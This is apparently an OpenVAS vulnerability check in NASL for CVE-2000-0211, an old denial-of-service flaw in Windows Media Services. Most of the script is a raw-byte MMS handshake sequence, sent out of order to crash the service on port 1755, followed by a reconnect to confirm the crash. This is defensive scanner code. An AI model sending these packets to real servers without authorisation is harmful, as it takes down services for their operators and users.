###############################################################################
# OpenVAS Vulnerability Test
#
# Microsoft Windows Media Service Handshake Sequence DoS Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802888");
  script_version("2019-05-03T12:31:27+0000");
  script_cve_id("CVE-2000-0211");
  script_bugtraq_id(1000);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2019-05-03 12:31:27 +0000 (Fri, 03 May 2019)");
  script_tag(name:"creation_date", value:"2012-07-30 13:22:23 +0530 (Mon, 30 Jul 2012)");
  script_name("Microsoft Windows Media Service Handshake Sequence DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Windows : Microsoft Bulletins");
  script_dependencies("find_service.nasl", "os_detection.nasl");
  script_require_ports(1755);
  script_mandatory_keys("Host/runs_windows");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/4034");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/19759");
  script_xref(name:"URL", value:"http://technet.microsoft.com/en-us/security/bulletin/fq00-013");
  script_xref(name:"URL", value:"http://support.microsoft.com/default.aspx?scid=kb;[LN];253943");
  script_xref(name:"URL", value:"http://technet.microsoft.com/en-us/security/bulletin/ms00-013");

  script_tag(name:"impact", value:"Successful exploitation could allow remote attackers to cause denial of
  service conditions.");
  script_tag(name:"affected", value:"Microsoft Windows 2000
  Microsoft Windows NT 4.0
  Windows Media Services 4.0 and 4.1");
  script_tag(name:"insight", value:"The handshake sequence between a Windows Media server and a Windows Media
  Player occurs in a particular order. If a series of client handshake packets
  are sent in a particular misordered sequence, with certain timing
  constraints, the server attempts to use a resource before it has been
  initialized causing the Windows Media Unicast Service to crash.");
  script_tag(name:"solution", value:"The vendor has released updates. Please see the references for more information.");
  script_tag(name:"summary", value:"This host is running Microsoft Windows Media Service and is prone
  to denial of service vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");

## Media Service Port
port = 1755;

if(!get_port_state(port)){
  exit(0);
}

soc1 = open_sock_tcp(port);
if(!soc1){
  exit(0);
}

mss_req1 = raw_string(0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0,           ## Command Signature
                      0xa0, 0x00, 0x00, 0x00,                                   ## Command Length
                      0x4d, 0x4d, 0x53, 0x20,                                   ## Protocol Type : MMS (Microsoft Media Server)
                      0x14, 0x00, 0x00, 0x00,                                   ## Length until end
                      0x00, 0x00, 0x00, 0x00,                                   ## Sequence number
                      0xf8, 0x53, 0xe3, 0xa5, 0x9b, 0xc4, 0x00, 0x40,           ## Time Stamp
                      0x12, 0x00, 0x00, 0x00,                                   ## Length until end
                      0x01, 0x00,                                               ## Cmd : Connect Info (0x0001)
                      0x03, 0x00,                                               ## Cmd Direction : to Server (0x0003)
                      0xf0, 0xf0, 0xf0, 0xf0,                                   ## Prefix 1
                      0x0b, 0x00, 0x04, 0x00,                                   ## Prefix 2
                      0x1c, 0x00, 0x03, 0x00, 0x4e, 0x00, 0x53, 0x00, 0x50,     ## Player Info
                      0x00, 0x6c, 0x00, 0x61, 0x00, 0x79, 0x00, 0x65, 0x00,
                      0x72, 0x00, 0x2f, 0x00, 0x34, 0x00, 0x2e, 0x00, 0x31,
                      0x00, 0x2e, 0x00, 0x30, 0x00, 0x2e, 0x00, 0x33, 0x00,
                      0x38, 0x00, 0x35, 0x00, 0x37, 0x00, 0x3b, 0x00, 0x20,
                      0x00, 0x7b, 0x00, 0x30, 0x00, 0x32, 0x00, 0x64, 0x00,
                      0x30, 0x00, 0x63, 0x00, 0x32, 0x00, 0x63, 0x00, 0x30,
                      0x00, 0x2d, 0x00, 0x62, 0x00, 0x35, 0x00, 0x30, 0x00,
                      0x37, 0x00, 0x2d, 0x00, 0x31, 0x00, 0x31, 0x00, 0x64,
                      0x00, 0x32, 0x00, 0x2d, 0x00, 0x39, 0x00, 0x61, 0x00,
                      0x61, 0x00, 0x38, 0x00, 0x2d, 0x00, 0x62, 0x00, 0x37,
                      0x00, 0x30, 0x00, 0x66, 0x00, 0x33, 0x00, 0x30, 0x00,
                      0x34, 0x00, 0x34, 0x00, 0x61, 0x00, 0x65, 0x00, 0x37,
                      0x00, 0x65, 0x00, 0x7d, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00);

send(socket:soc1 , data: mss_req1);
mms_res = recv(socket:soc1, length:512);

if(!mms_res || "MMS" >!< mms_res)
{
  close(soc1);
  exit(0);
}

## Microsoft Media Service Transfer Request to Server
mss_req2 = raw_string(0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x20,
                      0x00, 0x00, 0x00, 0x4d, 0x4d, 0x53, 0x20, 0x04, 0x00,
                      0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x5e, 0xba, 0x49,
                      0x0c, 0x02, 0x2b, 0x01, 0x40, 0x02, 0x00, 0x00, 0x00,
                      0x18, 0x00, 0x03, 0x00, 0xf1, 0xf0, 0xf0, 0xf0, 0x0b,
                      0x00, 0x04, 0x00);

mss_req3 = raw_string(0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x60,
                      0x00, 0x00, 0x00, 0x4d, 0x4d, 0x53, 0x20, 0x0c, 0x00,
                      0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x83, 0xc0, 0xca,
                      0xa1, 0x45, 0xb6, 0x01, 0x40, 0x0a, 0x00, 0x00, 0x00,
                      0x02, 0x00, 0x03, 0x00, 0xf1, 0xf0, 0xf0, 0xf0, 0xff,
                      0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0xa0, 0x00, 0x02, 0x00, 0x00, 0x00, 0x5c, 0x00, 0x5c,
                      0x00, 0x31, 0x00, 0x39, 0x00, 0x32, 0x00, 0x2e, 0x00,
                      0x31, 0x00, 0x36, 0x00, 0x38, 0x00, 0x2e, 0x00, 0x30,
                      0x00, 0x2e, 0x00, 0x32, 0x00, 0x5c, 0x00, 0x54, 0x00,
                      0x43, 0x00, 0x50, 0x00, 0x5c, 0x00, 0x31, 0x00, 0x31,
                      0x00, 0x31, 0x00, 0x31, 0x00, 0x00, 0x00, 0x32, 0x00,
                      0x63, 0x00, 0x30, 0x00);

mss_req4 = raw_string(0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x88,
                      0x00, 0x00, 0x00, 0x4d, 0x4d, 0x53, 0x20, 0x11, 0x00,
                      0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x2b, 0x87, 0x16,
                      0xd9, 0xce, 0xf7, 0x01, 0x40, 0x0f, 0x00, 0x00, 0x00,
                      0x05, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0xff,
                      0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00, 0x54, 0x00, 0x68, 0x00, 0x65, 0x00, 0x20,
                      0x00, 0x45, 0x00, 0x61, 0x00, 0x67, 0x00, 0x6c, 0x00,
                      0x65, 0x00, 0x73, 0x00, 0x20, 0x00, 0x54, 0x00, 0x65,
                      0x00, 0x71, 0x00, 0x75, 0x00, 0x69, 0x00, 0x6c, 0x00,
                      0x61, 0x00, 0x20, 0x00, 0x53, 0x00, 0x75, 0x00, 0x6e,
                      0x00, 0x72, 0x00, 0x69, 0x00, 0x73, 0x00, 0x65, 0x00,
                      0x20, 0x00, 0x32, 0x00, 0x38, 0x00, 0x6b, 0x00, 0x2f,
                      0x00, 0x65, 0x00, 0x61, 0x00, 0x67, 0x00, 0x6c, 0x00,
                      0x65, 0x00, 0x73, 0x00, 0x32, 0x00, 0x38, 0x00, 0x2e,
                      0x00, 0x61, 0x00, 0x73, 0x00, 0x66, 0x00, 0x00, 0x00,
                      0x62, 0x00, 0x37, 0x00, 0x30, 0x00, 0x66, 0x00);

mss_req5 = raw_string(0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x48,
                      0x00, 0x00, 0x00, 0x4d, 0x4d, 0x53, 0x20, 0x09, 0x00,
                      0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x67, 0x66, 0x66,
                      0x66, 0x66, 0x66, 0x02, 0x40, 0x07, 0x00, 0x00, 0x00,
                      0x15, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,
                      0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x65, 0x00, 0x20,
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0xac, 0x40, 0x02,
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00);

mss_req6 = raw_string(0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x30,
                      0x00, 0x00, 0x00, 0x4d, 0x4d, 0x53, 0x20, 0x06, 0x00,
                      0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0a, 0xd7, 0xa3,
                      0x70, 0x3d, 0x0a, 0x11, 0x40, 0x04, 0x00, 0x00, 0x00,
                      0x33, 0x00, 0x03, 0x00, 0x02, 0x00, 0x00, 0x00, 0xff,
                      0xff, 0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0x02, 0x00,
                      0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x65, 0x00, 0x20,
                      0x00);

mss_req7 = raw_string(0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x38,
                      0x00, 0x00, 0x00, 0x4d, 0x4d, 0x53, 0x20, 0x07, 0x00,
                      0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x2f, 0xdd, 0x24,
                      0x06, 0x81, 0x15, 0x11, 0x40, 0x05, 0x00, 0x00, 0x00,
                      0x07, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0xff,
                      0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                      0xff, 0x16, 0xca, 0x03, 0x80, 0x04, 0x00, 0x00, 0x00);

## Send the Misordered Handshake Sequence
send(socket:soc1 , data: mss_req2);
send(socket:soc1 , data: mss_req3);
send(socket:soc1 , data: mss_req4);
send(socket:soc1 , data: mss_req5);
send(socket:soc1 , data: mss_req6);
send(socket:soc1 , data: mss_req7);
res = recv(socket:soc1, length:1024);

sleep(7);
close(soc1);

soc2 = open_sock_tcp(port);

## If couldn't open soc then mms is crashed
if(!soc2)
{
  security_message(port);
  exit(0);
}
else
{
  ## Send the Connect request again
  send(socket:soc2 , data: mss_req1);
  mms_res = recv(socket:soc2, length:512);
  close(soc2);

  if(!mms_res || "MMS" >!< mms_res){
    security_message(port);
  }
}
